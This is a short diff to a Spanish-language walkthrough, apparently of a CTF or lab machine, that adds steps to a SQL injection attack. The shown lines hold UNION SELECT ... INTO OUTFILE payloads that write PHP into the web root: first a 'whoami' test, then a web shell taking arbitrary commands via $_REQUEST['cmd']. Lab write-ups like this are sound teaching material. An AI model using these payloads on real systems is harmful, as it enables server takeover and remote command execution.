@@ -124,8 +124,16 @@ union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/htm
 ```
 ![Resultado de Nmap](IMG/bd8.png)
 
+Y si ahora visitamos esa ruta vemos que tenemos ejecucion remota de comandos
 
+![Resultado de Nmap](IMG/rce.png)
 
+Vamos a crearnos un archivo donde nosotros podamos ejecutar el comando que queramos
+
+```
+union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/reverseshell.php"-- -
+```
+![Resultado de Nmap](IMG/reverse.png)
 
 
 
